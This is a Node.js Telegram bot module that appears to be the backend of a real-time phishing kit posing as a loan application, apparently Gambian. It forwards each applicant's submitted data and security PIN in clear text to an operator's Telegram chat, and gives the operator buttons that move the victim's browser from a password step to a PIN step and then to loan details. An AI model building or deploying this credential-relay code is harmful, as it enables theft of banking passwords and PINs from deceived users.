require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// Initialize bot without polling (Render uses webhooks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

// Prevent application crash on global bot errors
bot.on("error", (err) => console.error("Telegram Bot Error:", err.message));

const botManager = {
    bot: bot,

    sendToAdmin: async (appId, title, data, needsApproval = false) => {
        try {
            let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
            for (const [k, v] of Object.entries(data)) {
                msg += `<b>${k}:</b> <code>${v}</code>\n`;
            }

            const options = { parse_mode: 'HTML' };
            if (needsApproval) {
                options.reply_markup = {
                    inline_keyboard: [[
                        { text: "✅ APPROVE (Move to PIN)", callback_data: `approve_1_${appId}` },
                        { text: "❌ REJECT", callback_data: `reject_0_${appId}` }
                    ]]
                };
            }
            await bot.sendMessage(ADMIN_ID, msg, options);
        } catch (err) {
            console.error("Error sending message to admin:", err.message);
        }
    },

    sendFinalApproval: async (appId, pin) => {
        try {
            const msg = `🏁 <b>🇬🇲 STEP 2: SECURITY PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>`;
            await bot.sendMessage(ADMIN_ID, msg, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✅ COMPLETE PIN (Move to Loan)", callback_data: `approve_2_${appId}` },
                        { text: "❌ REJECT", callback_data: `reject_0_${appId}` }
                    ]]
                }
            });
        } catch (err) {
            console.error("Error sending final approval message:", err.message);
        }
    }
};

// Handle Admin Button Clicks safely with try-catch blocks
bot.on("callback_query", async (query) => {
    try {
        if (!query.data) return;
        const [action, step, appId] = query.data.split("_");
        const io = global.io;

        if (!io) {
            console.error("Socket.io instance global.io is not initialized yet.");
            return;
        }

        let statusText = "";

        if (action === "approve") {
            if (step === "1") {
                io.to(appId).emit('password-verified');
                await bot.answerCallbackQuery(query.id, { text: "PIN input shown to user" });
                statusText = "\n\n✅ <b>ACTION: APPROVED (MOVED TO PIN)</b>";
            } 
            else if (step === "2") {
                io.to(appId).emit('pin-verified');
                await bot.answerCallbackQuery(query.id, { text: "PIN confirmed. User moving to Loan details." });
                statusText = "\n\n✅ <b>ACTION: PIN APPROVED (MOVED TO LOAN)</b>";
            }
        }

        if (action === "reject") {
            io.to(appId).emit('error', { message: "Application declined by admin." });
            await bot.answerCallbackQuery(query.id, { text: "Application Rejected" });
            statusText = "\n\n❌ <b>ACTION: REJECTED</b>";
        }

        // Safely edit message layout without risking parsing crashes
        if (query.message && query.message.text) {
            await bot.editMessageText(query.message.text + statusText, {
                chat_id: ADMIN_ID,
                message_id: query.message.message_id,
                parse_mode: 'HTML'
            }).catch(() => {
                // Fallback text if HTML formatting breaks
                bot.editMessageText(query.message.text + statusText.replace(/<[^>]*>/g, ''), {
                    chat_id: ADMIN_ID,
                    message_id: query.message.message_id
                });
            });
        }
    } catch (err) {
        console.error("Callback query handling error caught safely:", err.message);
    }
});

module.exports = botManager;